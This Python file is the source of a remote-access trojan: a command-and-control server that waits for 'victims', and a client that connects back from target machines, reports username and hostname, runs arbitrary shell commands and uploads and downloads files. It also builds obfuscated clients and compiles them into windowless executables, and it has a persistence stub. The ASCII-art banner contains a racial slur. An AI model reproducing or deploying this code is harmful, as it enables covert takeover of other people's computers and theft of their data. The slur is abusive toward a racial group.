import socket
import threading
import json
import base64
import os
import subprocess
import time
import sys
import shutil
import tempfile
from pathlib import Path

class EpicLoader:
    def __init__(self, host='0.0.0.0', port=1337):
        self.host = host
        self.port = port
        self.clients = []  # LIST OF CONNECTED CLIENT SOCKETS
        self.client_info = {}  # CLIENT METADATA (IP, OS, ETC)
        self.running = False
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        print(r"""
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⢿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⡇⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀nigga⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⡇⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣷⣦⣤⣤⣤⣤⣤⣤⣤⣴⣶⣾⣿⣿⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠻⠿⠿⠿⠿⠿⠿⠟⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        """)
        print("🔥 PYTHON LOADER 9000 INITIALIZED 🔥")
        print("LISTENING ON {}:{}".format(host, port))
        print("TYPE 'help' TO SEE AVAILABLE COMMANDS\n")

    def start_server(self):
        """START THE SERVER AND LISTEN FOR INCOMING CONNECTIONS"""
        try:
            self.sock.bind((self.host, self.port))
            self.sock.listen(5)
            self.running = True
            print("[+] SERVER IS NOW LIVE! WAITING FOR VICTIMS... I MEAN, CLIENTS... 😈")
            
            # START ACCEPTING CLIENTS IN A THREAD
            accept_thread = threading.Thread(target=self.accept_clients)
            accept_thread.daemon = True
            accept_thread.start()
            
            # START COMMAND INTERFACE
            self.command_interface()
            
        except Exception as e:
            print("[-] FAILED TO START SERVER: {}".format(e))
            self.running = False

    def accept_clients(self):
        """ACCEPT INCOMING CLIENT CONNECTIONS"""
        while self.running:
            try:
                client_sock, client_addr = self.sock.accept()
                print("\n[+] NEW CLIENT CONNECTED: {}:{}".format(client_addr[0], client_addr[1]))
                
                # ADD CLIENT TO LIST
                self.clients.append(client_sock)
                self.client_info[client_sock] = {
                    'address': client_addr,
                    'connected_at': time.time(),
                    'os': 'Unknown',
                    'username': 'Unknown'
                }
                
                # START CLIENT HANDLER THREAD
                client_thread = threading.Thread(target=self.handle_client, args=(client_sock,))
                client_thread.daemon = True
                client_thread.start()
                
            except Exception as e:
                if self.running:
                    print("[-] ERROR ACCEPTING CLIENT: {}".format(e))

    def handle_client(self, client_sock):
        """HANDLE COMMUNICATION WITH A CLIENT"""
        try:
            while self.running:
                # RECEIVE DATA FROM CLIENT
                data = self.recv_data(client_sock)
                if not data:
                    break
                    
                # PARSE THE JSON DATA
                try:
                    message = json.loads(data)
                    msg_type = message.get('type', 'unknown')
                    
                    if msg_type == 'info':
                        # UPDATE CLIENT INFO
                        self.client_info[client_sock].update(message.get('data', {}))
                        print("[+] CLIENT {} UPDATED INFO: {}".format(
                            self.client_info[client_sock]['address'], message['data']))
                    
                    elif msg_type == 'command_result':
                        # SHOW COMMAND RESULT
                        result = message.get('data', {}).get('output', 'No output')
                        print("\n[COMMAND RESULT FROM {}]:\n{}".format(
                            self.client_info[client_sock]['address'], result))
                    
                    elif msg_type == 'file_content':
                        # SAVE UPLOADED FILE
                        file_data = base64.b64decode(message.get('data', {}).get('content', ''))
                        filename = message.get('data', {}).get('filename', 'unknown_file')
                        with open(filename, 'wb') as f:
                            f.write(file_data)
                        print("[+] FILE RECEIVED: {} ({} bytes)".format(filename, len(file_data)))
                        
                except json.JSONDecodeError:
                    print("[-] INVALID JSON FROM CLIENT: {}".format(data))
                    
        except Exception as e:
            print("[-] CLIENT HANDLER ERROR: {}".format(e))
        finally:
            # CLEAN UP DISCONNECTED CLIENT
            if client_sock in self.clients:
                self.clients.remove(client_sock)
            if client_sock in self.client_info:
                del self.client_info[client_sock]
            client_sock.close()
            print("[-] CLIENT DISCONNECTED")

    def change_listen_address(self, new_host, new_port, restart=False):
        try:
            was_running = self.running
            if was_running:
                print("[+] STOPPING SERVER TO CHANGE LISTEN ADDRESS")
                self.running = False
                for client in self.clients:
                    client.Close()
                self.sock.close()
                time.sleep(1)

            self.host = new_host
            self.port = new_port

            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

            print("[+] LISTEN ADDRESS UPDATED: {}:{}".format(new_host, new_port))

            if was_running and restart:
                print("[+] RESTARTING SERVER ON NEW ADDRESS")
                self.start_server()

            return True
        
        except Exception as e:
            print("[-] FAILED TO CHANGE LISTEN ADDRESS: {}".format(e))
            if was_running:
                try:
                    self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    self.sock.bind((self.host, self.port))
                    self.start_server()
                except:
                    print("[-] FAILED TO RESTORE ORIGINAL SERVER SETTINGS")
            return False
        
    def change_listen_interactive(self):
        try:
            print("")
            print("\n[+] CURRENT LISTEN ADDRESS: {}:{}".format(self.host, self.port))
            new_host = input("ENTER NEW IP [{}]: ".format(self.host)) or self.host
            new_port_input = input("ENTER NEW PORT [{}]: ".format(self.port)) or str(self.port)
        
            try:
                new_port = int(new_port_input)
            except ValueError:
                print("[-] INVALID PORT NUMBER")
                return
        
            restart = False
            if self.running:
                restart_input = input("RESTART SERVER ON NEW ADDRESS? (y/N): ").lower().strip()
                restart = restart_input in ['y', 'yes', '1']
        
            self.change_listen_address(new_host, new_port, restart)
        
        except Exception as e:
            print("[-] FAILED TO CHANGE LISTEN ADDRESS: {}".format(e))

    def build_client(self, output_path, server_ip, server_port, obfuscate=False):
        """BUILD A CUSTOM CLIENT WITH SPECIFIED IP AND PORT"""
        try:
            print("[+] BUILDING CUSTOM CLIENT...")
            
            # READ THE TEMPLATE CLIENT CODE
            client_template = """
import socket
import json
import base64
import os
import subprocess
import time
import sys

class EpicClient:
    def __init__(self, server_host="{SERVER_HOST}", server_port={SERVER_PORT}):
        self.server_host = server_host
        self.server_port = server_port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
    def connect_to_server(self):
        try:
            self.sock.connect((self.server_host, self.server_port))
            self.send_info()
            self.listen_for_commands()
        except Exception as e:
            pass
            
    def send_info(self):
        try:
            import platform
            import getpass
            info = {{
                'type': 'info',
                'data': {{
                    'os': platform.system() + ' ' + platform.release(),
                    'username': getpass.getuser(),
                    'hostname': platform.node()
                }}
            }}
            self.send_data(json.dumps(info))
        except:
            pass
            
    def listen_for_commands(self):
        try:
            while True:
                data = self.recv_data()
                if not data: break
                try:
                    message = json.loads(data)
                    if message.get('type') == 'command':
                        self.execute_command(message.get('data', {{}}).get('command', ''))
                    elif message.get('type') == 'upload_file':
                        self.save_file(message.get('data', {{}}))
                except:
                    pass
        except:
            pass
            
    def execute_command(self, command):
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            output = result.stdout + result.stderr
            response = {{
                'type': 'command_result',
                'data': {{'command': command, 'output': output, 'return_code': result.returncode}}
            }}
            self.send_data(json.dumps(response))
        except:
            pass
            
    def save_file(self, file_data):
        try:
            path = file_data.get('path', '')
            content = base64.b64decode(file_data.get('content', ''))
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, 'wb') as f:
                f.write(content)
        except:
            pass
            
    def send_data(self, data):
        try:
            data = data.encode('utf-8')
            length = len(data)
            self.sock.sendall(length.to_bytes(4, 'big') + data)
        except:
            pass
            
    def recv_data(self):
        try:
            length_bytes = self.sock.recv(4)
            if not length_bytes: return None
            length = int.from_bytes(length_bytes, 'big')
            data = b''
            while len(data) < length:
                chunk = self.sock.recv(min(4096, length - len(data)))
                if not chunk: return None
                data += chunk
            return data.decode('utf-8')
        except:
            return None

if __name__ == "__main__":
    client = EpicClient("{SERVER_HOST}", {SERVER_PORT})
    while True:
        try:
            client.connect_to_server()
        except:
            pass
        time.sleep(60)
"""
            # REPLACE PLACEHOLDERS
            client_code = client_template.replace("{SERVER_HOST}", server_ip).replace("{SERVER_PORT}", str(server_port))
            
            # WRITE THE CLIENT CODE
            with open(output_path, 'w', encoding='utf-8') as f:
                f.write(client_code)
                
            print("[+] CLIENT BUILT: {}".format(output_path))
            
            # OBFUSCATE IF REQUESTED
            if obfuscate:
                self.obfuscate_client(output_path)
                
            return True
            
        except Exception as e:
            print("[-] FAILED TO BUILD CLIENT: {}".format(e))
            return False
        
    def obfuscate_client(self, client_path):
        """BASIC CLIENT OBFUSCATION"""
        try:
            with open(client_path, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # SIMPLE OBFUSCATION TECHNIQUES
            obfuscated = content
            
            # RENAME VARIABLES
            obfuscated = obfuscated.replace("EpicClient", "X" + str(hash("EpicClient"))[-8:])
            obfuscated = obfuscated.replace("server_host", "h" + str(hash("host"))[-6:])
            obfuscated = obfuscated.replace("server_port", "p" + str(hash("port"))[-6:])
            
            # ADD RANDOM COMMENTS AND WHITESPACE
            lines = obfuscated.split('\n')
            obfuscated_lines = []
            for line in lines:
                if line.strip() and not line.strip().startswith('#'):
                    # ADD RANDOM WHITESPACE
                    if len(line.strip()) > 10:
                        obfuscated_lines.append(' ' * (hash(line) % 4) + line.strip())
                    else:
                        obfuscated_lines.append(line)
                else:
                    obfuscated_lines.append(line)
            
            obfuscated = '\n'.join(obfuscated_lines)
            
            # WRITE OBFUSCATED VERSION
            with open(client_path, 'w', encoding='utf-8') as f:
                f.write(obfuscated)
                
            print("[+] CLIENT OBFUSCATED")
            
        except Exception as e:
            print("[-] OBFUSCATION FAILED: {}".format(e))

    def compile_client(self, python_path, output_exe):
        """COMPILE CLIENT TO EXECUTABLE"""
        try:
            if not shutil.which('pyinstaller'):
                print("[-] PYINSTALLER NOT FOUND. INSTALL IT: pip install pyinstaller")
                return False
                
            print("[+] COMPILING CLIENT TO EXE...")
            
            # USE PYINSTALLER TO COMPILE
            cmd = [
                'pyinstaller',
                '--onefile',
                '--noconsole',
                '--name', os.path.basename(output_exe).replace('.exe', ''),
                python_path
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                # MOVE THE EXE TO DESIRED LOCATION
                dist_path = os.path.join('dist', os.path.basename(output_exe))
                if os.path.exists(dist_path):
                    shutil.move(dist_path, output_exe)
                    shutil.rmtree('dist')
                    shutil.rmtree('build')
                    if os.path.exists(os.path.basename(python_path) + '.spec'):
                        os.remove(os.path.basename(python_path) + '.spec')
                    
                    print("[+] CLIENT COMPILED: {}".format(output_exe))
                    return True
            else:
                print("[-] COMPILATION FAILED: {}".format(result.stderr))
                return False
                
        except Exception as e:
            print("[-] COMPILATION ERROR: {}".format(e))
            return False

    def send_command(self, client_sock, command):
        """SEND A COMMAND TO A CLIENT"""
        try:
            message = {
                'type': 'command',
                'data': {
                    'command': command
                }
            }
            self.send_data(client_sock, json.dumps(message))
            print("[+] COMMAND SENT: {}".format(command))
        except Exception as e:
            print("[-] FAILED TO SEND COMMAND: {}".format(e))

    def upload_file(self, client_sock, local_path, remote_path):
        """UPLOAD A FILE TO CLIENT"""
        try:
            if not os.path.exists(local_path):
                print("[-] FILE NOT FOUND: {}".format(local_path))
                return
                
            with open(local_path, 'rb') as f:
                file_content = base64.b64encode(f.read()).decode('utf-8')
                
            message = {
                'type': 'upload_file',
                'data': {
                    'filename': os.path.basename(remote_path),
                    'path': remote_path,
                    'content': file_content
                }
            }
            self.send_data(client_sock, json.dumps(message))
            print("[+] FILE UPLOADED: {} -> {}".format(local_path, remote_path))
            
        except Exception as e:
            print("[-] UPLOAD FAILED: {}".format(e))

    def download_file(self, client_sock, remote_path, local_path):
        """DOWNLOAD A FILE FROM CLIENT"""
        try:
            message = {
                'type': 'download_file',
                'data': {
                    'path': remote_path
                }
            }
            self.send_data(client_sock, json.dumps(message))
            print("[+] DOWNLOAD REQUEST SENT: {} -> {}".format(remote_path, local_path))
            
        except Exception as e:
            print("[-] DOWNLOAD REQUEST FAILED: {}".format(e))

    def send_data(self, sock, data):
        """SEND DATA WITH LENGTH PREFIX"""
        try:
            # ADD LENGTH PREFIX
            data = data.encode('utf-8')
            length = len(data)
            sock.sendall(length.to_bytes(4, 'big') + data)
        except Exception as e:
            raise e

    def recv_data(self, sock):
        """RECEIVE DATA WITH LENGTH PREFIX"""
        try:
            # GET LENGTH
            length_bytes = sock.recv(4)
            if not length_bytes:
                return None
            length = int.from_bytes(length_bytes, 'big')
            
            # GET DATA
            data = b''
            while len(data) < length:
                chunk = sock.recv(min(4096, length - len(data)))
                if not chunk:
                    return None
                data += chunk
                
            return data.decode('utf-8')
        except Exception as e:
            return None

    def list_clients(self):
        """SHOW ALL CONNECTED CLIENTS"""
        if not self.clients:
            print("[-] NO CLIENTS CONNECTED 😢")
            return
            
        print("\n" + "="*60)
        print("CONNECTED CLIENTS ({} TOTAL):".format(len(self.clients)))
        print("="*60)
        
        for i, client_sock in enumerate(self.clients):
            info = self.client_info.get(client_sock, {})
            addr = info.get('address', ('Unknown', 'Unknown'))
            os_info = info.get('os', 'Unknown')
            username = info.get('username', 'Unknown')
            uptime = time.time() - info.get('connected_at', 0)
            
            print("{}. {}:{} | {} | {} | {:.1f}s connected".format(
                i+1, addr[0], addr[1], username, os_info, uptime))
        print("="*60)

    def command_interface(self):
        """MAIN COMMAND INTERFACE"""
        while self.running:
            try:
                command = input("\nLOADER> ").strip()
            
                if command == 'help':
                    self.show_help()
                
                elif command == 'list':
                    self.list_clients()
                
                elif command == 'listen':
                    self.change_listen_interactive()
                
                elif command.startswith('listen '):
                    parts = command[7:].split(':')
                    if len(parts) == 2:
                        self.change_listen_address(parts[0], int(parts[1]))
                    else:
                        print("[-] USAGE: listen <ip>:<port>")
                    
                elif command.startswith('select '):
                # THIS IS THE MISSING COMMAND!
                    self.select_client(command[7:])
                
                elif command.startswith('build '):
                    parts = command[6:].split()
                    if len(parts) >= 2:
                        output_path = parts[0]
                        server_ip = parts[1]
                        server_port = int(parts[2]) if len(parts) > 2 else self.port
                        obfuscate = len(parts) > 3 and parts[3].lower() == 'obfuscate'
                        self.build_client(output_path, server_ip, server_port, obfuscate)
                    else:
                        print("[-] USAGE: build <output.py> <server_ip> [port] [obfuscate]")
                    
                elif command.startswith('compile '):
                    parts = command[8:].split()
                    if len(parts) == 2:
                        self.compile_client(parts[0], parts[1])
                    else:
                        print("[-] USAGE: compile <input.py> <output.exe>")
            
                elif command == 'restart':
                    self.restart_server()
                
                elif command == 'exit':
                    print("[+] SHUTTING DOWN SERVER...")
                    self.running = False
                    for client in self.clients:
                        client.close()
                    self.sock.close()
                    break
                
                elif command == 'clear':
                    os.system('cls' if os.name == 'nt' else 'clear')
                
                elif command == '':
                    continue
                
                else:
                    print("[-] UNKNOWN COMMAND. TYPE 'help' FOR AVAILABLE COMMANDS")
                
            except KeyboardInterrupt:
                print("\n[+] SHUTTING DOWN...")
                self.running = False
                break
            except Exception as e:
                print("[-] COMMAND ERROR: {}".format(e))

    def select_client(self, client_str):
        """SELECT A CLIENT TO INTERACT WITH"""
        try:
            if not self.clients:
                print("[-] NO CLIENTS CONNECTED")
                return
                
            # TRY TO PARSE AS INDEX
            try:
                index = int(client_str) - 1
                if 0 <= index < len(self.clients):
                    client_sock = self.clients[index]
                    self.client_interaction(client_sock)
                else:
                    print("[-] INVALID CLIENT INDEX")
            except ValueError:
                print("[-] PLEASE SPECIFY CLIENT NUMBER")
                
        except Exception as e:
            print("[-] SELECT ERROR: {}".format(e))

    def client_interaction(self, client_sock):
        """INTERACT WITH A SPECIFIC CLIENT"""
        info = self.client_info.get(client_sock, {})
        addr = info.get('address', ('Unknown', 'Unknown'))
        
        print("\n[+] INTERACTING WITH CLIENT {}:{}".format(addr[0], addr[1]))
        print("[+] TYPE 'back' TO RETURN TO MAIN MENU")
        print("[+] TYPE 'help' FOR CLIENT COMMANDS\n")
        
        while self.running:
            try:
                cmd = input("CLIENT/{}$ ".format(addr[0])).strip()
                
                if cmd == 'back':
                    break
                elif cmd == 'help':
                    print("""
CLIENT COMMANDS:
  shell <command>    - Execute remote command
  upload <loc> <rem> - Upload file to client
  download <rem> <loc> - Download file from client
  info              - Get client system info
  persistence       - Install persistence
  back              - Return to main menu
                    """)
                elif cmd == 'info':
                    self.send_command(client_sock, 'systeminfo')
                elif cmd == 'persistence':
                    self.install_persistence(client_sock)
                elif cmd.startswith('shell '):
                    self.send_command(client_sock, cmd[6:])
                elif cmd.startswith('upload '):
                    parts = cmd[7:].split()
                    if len(parts) == 2:
                        self.upload_file(client_sock, parts[0], parts[1])
                    else:
                        print("[-] USAGE: upload <local_path> <remote_path>")
                elif cmd.startswith('download '):
                    parts = cmd[9:].split()
                    if len(parts) == 2:
                        self.download_file(client_sock, parts[0], parts[1])
                    else:
                        print("[-] USAGE: download <remote_path> <local_path>")
                elif cmd == '':
                    continue
                else:
                    print("[-] UNKNOWN CLIENT COMMAND")
                    
            except Exception as e:
                print("[-] CLIENT INTERACTION ERROR: {}".format(e))
                break

    def install_persistence(self, client_sock):
        """INSTALL PERSISTENCE ON CLIENT"""
        try:
            # THIS WOULD BE CLIENT-SIDE CODE TO INSTALL PERSISTENCE
            # FOR DEMO, WE'LL JUST SEND A COMMAND
            self.send_command(client_sock, "echo 'Persistence would be installed here'")
            print("[+] PERSISTENCE INSTALLATION COMMAND SENT")
        except Exception as e:
            print("[-] PERSISTENCE INSTALLATION FAILED: {}".format(e))

    def show_help(self):
        """SHOW HELP MESSAGE"""
        print("""
AVAILABLE COMMANDS:
  list                - Show connected clients
  listen              - Change listen address interactively
  listen <ip>:<port>  - Change to specific IP:Port
  build <out.py> <ip> [port] [obfuscate] - Build custom client
  compile <in.py> <out.exe> - Compile client to executable
  select <n>          - Interact with client number n
  clear               - Clear screen
  exit                - Shutdown server

CLIENT COMMANDS (after selection):
  shell <command>     - Execute remote command
  upload <loc> <rem>  - Upload file to client
  download <rem> <loc> - Download file from client
  info               - Get client system info
  persistence        - Install persistence
  back               - Return to main menu
        """)

# CLIENT CODE (FOR TARGET MACHINES)
class EpicClient:
    def __init__(self, server_host, server_port=1337):
        self.server_host = server_host
        self.server_port = server_port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
    def connect_to_server(self):
        """CONNECT TO THE LOADER SERVER"""
        try:
            self.sock.connect((self.server_host, self.server_port))
            print("[+] CONNECTED TO SERVER {}:{}".format(self.server_host, self.server_port))
            
            # SEND CLIENT INFO
            self.send_info()
            
            # START LISTENING FOR COMMANDS
            self.listen_for_commands()
            
        except Exception as e:
            print("[-] CONNECTION FAILED: {}".format(e))
            
    def send_info(self):
        """SEND SYSTEM INFORMATION TO SERVER"""
        try:
            import platform
            import getpass
            
            info = {
                'type': 'info',
                'data': {
                    'os': platform.system() + ' ' + platform.release(),
                    'username': getpass.getuser(),
                    'hostname': platform.node(),
                    'architecture': platform.machine()
                }
            }
            self.send_data(json.dumps(info))
            
        except Exception as e:
            print("[-] FAILED TO SEND INFO: {}".format(e))
            
    def listen_for_commands(self):
        """LISTEN FOR COMMANDS FROM SERVER"""
        try:
            while True:
                data = self.recv_data()
                if not data:
                    break
                    
                try:
                    message = json.loads(data)
                    msg_type = message.get('type', 'unknown')
                    
                    if msg_type == 'command':
                        self.execute_command(message.get('data', {}).get('command', ''))
                    elif msg_type == 'upload_file':
                        self.save_file(message.get('data', {}))
                    elif msg_type == 'download_file':
                        self.send_file(message.get('data', {}).get('path', ''))
                        
                except json.JSONDecodeError:
                    print("[-] INVALID JSON FROM SERVER")
                    
        except Exception as e:
            print("[-] COMMAND LISTENER ERROR: {}".format(e))
        finally:
            self.sock.close()
            
    def execute_command(self, command):
        """EXECUTE A SHELL COMMAND AND SEND RESULT BACK"""
        try:
            print("[+] EXECUTING COMMAND: {}".format(command))
            
            # EXECUTE THE COMMAND
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            output = result.stdout + result.stderr
            
            # SEND RESULT BACK
            response = {
                'type': 'command_result',
                'data': {
                    'command': command,
                    'output': output,
                    'return_code': result.returncode
                }
            }
            self.send_data(json.dumps(response))
            
        except subprocess.TimeoutExpired:
            self.send_data(json.dumps({
                'type': 'command_result',
                'data': {
                    'command': command,
                    'output': 'COMMAND TIMED OUT AFTER 30 SECONDS',
                    'return_code': -1
                }
            }))
        except Exception as e:
            self.send_data(json.dumps({
                'type': 'command_result',
                'data': {
                    'command': command,
                    'output': 'ERROR: {}'.format(str(e)),
                    'return_code': -1
                }
            }))
            
    def save_file(self, file_data):
        """SAVE UPLOADED FILE"""
        try:
            filename = file_data.get('filename', '')
            path = file_data.get('path', '')
            content = base64.b64decode(file_data.get('content', ''))
            
            # CREATE DIRECTORY IF NEEDED
            os.makedirs(os.path.dirname(path), exist_ok=True)
            
            with open(path, 'wb') as f:
                f.write(content)
                
            print("[+] FILE SAVED: {}".format(path))
            
        except Exception as e:
            print("[-] FAILED TO SAVE FILE: {}".format(e))
            
    def send_file(self, file_path):
        """SEND FILE TO SERVER"""
        try:
            if not os.path.exists(file_path):
                print("[-] FILE NOT FOUND: {}".format(file_path))
                return
                
            with open(file_path, 'rb') as f:
                content = base64.b64encode(f.read()).decode('utf-8')
                
            response = {
                'type': 'file_content',
                'data': {
                    'filename': os.path.basename(file_path),
                    'path': file_path,
                    'content': content
                }
            }
            self.send_data(json.dumps(response))
            
        except Exception as e:
            print("[-] FAILED TO SEND FILE: {}".format(e))
            
    def send_data(self, data):
        """SEND DATA TO SERVER"""
        try:
            data = data.encode('utf-8')
            length = len(data)
            self.sock.sendall(length.to_bytes(4, 'big') + data)
        except Exception as e:
            raise e
            
    def recv_data(self):
        """RECEIVE DATA FROM SERVER"""
        try:
            length_bytes = self.sock.recv(4)
            if not length_bytes:
                return None
            length = int.from_bytes(length_bytes, 'big')
            
            data = b''
            while len(data) < length:
                chunk = self.sock.recv(min(4096, length - len(data)))
                if not chunk:
                    return None
                data += chunk
                
            return data.decode('utf-8')
        except Exception as e:
            return None

if __name__ == "__main__":
    # CHECK FOR COMMAND LINE ARGUMENTS
    if len(sys.argv) > 1:
        if sys.argv[1] == "client":
            if len(sys.argv) > 2:
                server_ip = sys.argv[2]
                server_port = int(sys.argv[3]) if len(sys.argv) > 3 else 1337
                client = EpicClient(server_ip, server_port)
                client.connect_to_server()
            else:
                print("Usage: python loader.py client <server_ip> [port]")
        elif sys.argv[1] == "listen" and len(sys.argv) > 2:
            # START WITH CUSTOM LISTEN ADDRESS
            parts = sys.argv[2].split(':')
            if len(parts) == 2:
                loader = EpicLoader(parts[0], int(parts[1]))
                loader.start_server()
            else:
                print("Usage: python loader.py listen <ip>:<port>")
        else:
            print("Usage: python loader.py [client <ip> [port] | listen <ip>:<port>]")
    else:
        # DEFAULT BEHAVIOR
        loader = EpicLoader()
        loader.start_server()